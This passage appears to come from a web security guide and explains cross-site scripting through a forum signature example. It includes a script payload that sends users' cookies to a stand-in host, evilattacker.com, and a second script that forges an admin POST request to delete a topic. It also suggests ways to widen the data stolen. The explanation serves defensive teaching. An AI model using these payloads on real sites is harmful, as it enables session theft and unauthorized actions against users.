A Cross-Site Scripting Example
==============================

Let's imagine that an attacker has stumbled across a custom built forum which allows users to display a small signature beneath their comments. Investigating this further, the attacker sets up an account, spams all topics in reach, and uses the following markup in their signature which is attached to all of their posts:

.. code-block:: html

    <script>document.write('<iframe src="http://evilattacker.com?cookie=' + document.cookie.escape() + '" height=0 width=0 />');</script>

By some miracle, the forum software includes this signature as-is in all those spammed topics for all the forum users to load into their browsers. The results should be obvious from the Javascript code. The attacker is injecting an iframe into the page which will appear as a teeny tiny dot (zero sized) at the very bottom of the page attracting no notice from anyone. The browser will send the request for the iframe content which passes each user's cookie value as a GET parameter to the attacker's URI where they can be collated and used in further attacks. While typical users aren't that much of a target for an attacker, a well designed trolling topic will no doubt attract a moderator or administrator whose cookie may be very valuable in gaining access to the forums moderation functions.

This is a simple example but feel free to extend it. Perhaps the attacker would like to know the username associated with this cookie? Easy! Add more Javascript to query the DOM and grab it from the current web page to include in a "username=" GET parameter to the attacker's URL. Perhaps they also need information about your browser to handle a Fingerprint defense of the session too? Just include the value from "navigator.userAgent".

This simple attack has a lot of repercussions including potentially gaining control over the forum as an administrator. It's for this reason that underestimating the potential of XSS attack is ill advised.

Of course, being a simple example, there is one flaw with the attacker's approach. Similar to examples using Javascript's alert() function I've presented something which has an obvious defense. All cookies containing sensitive data should be tagged with the HttpOnly flag which prevents Javascript from accessing the cookie data. The principle you should remember, however, is that if the attacker can inject Javascript, they can probably inject all conceivable Javascript. If they can't access the cookie and mount an attack using it directly, they will do what all good programmers would do: write an efficient automated attack.

.. code-block:: html
    :emphasize-lines: 4

     <script>
        var params = 'type=topic&action=delete&id=347';
        var http = new XMLHttpRequest();
        http.open('POST', 'forum.com/admin_control.php', true);
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        http.setRequestHeader("Content-length", params.length);
        http.setRequestHeader("Connection", "close");
        http.onreadystatechange = function() {
            if(http.readyState == 4 && http.status == 200) {
                // Do something else.
            }
        };
        http.send(params);
     </script>

The above is one possible use of Javascript to execute a POST request to delete a topic. We could encapsulate this in a check to only run for a moderator, i.e. if the user's name is displayed somewhere we can match it against a list of known moderators or detect any special styling applied to a moderator's displayed name in the absence of a known list.

As the above suggests, HttpOnly cookies are of limited use in defending against XSS. They block the logging of cookies by an attacker but do not actually prevent their use during an XSS attack. Furthermore, an attacker would prefer not to leave bread crumbs in the visible markup to arouse suspicion unless they actually want to be detected.

Next time you see an example using the Javascript alert() function, substitute it with a XMLHttpRequest object to avoid being underwhelmed.